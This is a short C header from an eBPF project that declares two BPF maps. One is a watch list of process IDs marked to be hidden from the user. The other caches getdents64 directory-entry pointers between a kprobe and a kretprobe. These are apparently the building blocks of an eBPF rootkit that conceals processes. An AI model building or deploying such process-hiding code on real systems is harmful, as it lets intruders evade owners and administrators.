/**
 * Contains all map declaration for the ebpf module.
 * 
 * @author Yekuuun
 */

#ifndef MAPS_H
#define MAPS_H

#include "bpf.h"
#include "vmlinux.h"
#include "config.h"
#include "utils.h"

/**
 * PID watch list.
 * 
 * @note => contains all pid to hide from user.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PID_ENTRIES);
    __type(key,   __u32);
    __type(value, __u8); //1 == hidden. 
} whitelist_pid SEC(".maps");

/**
 * Per-CPU storage for dirp address between kprobe and kretprobe.
 * 
 * Using LRU_HASH to avoid data saturation. avoid -E2BIG
 */
struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 512);
    __type(key, __u32);
    __type(value, struct linux_dirent64 *); //userspace ptr. (struct compat_linux_dirent __user * dirent) https://elixir.bootlin.com/linux/v6.17.3/source/fs/readdir.c#L565
} getdents64_cache SEC(".maps");

//---------------------------------------------------------------

#endif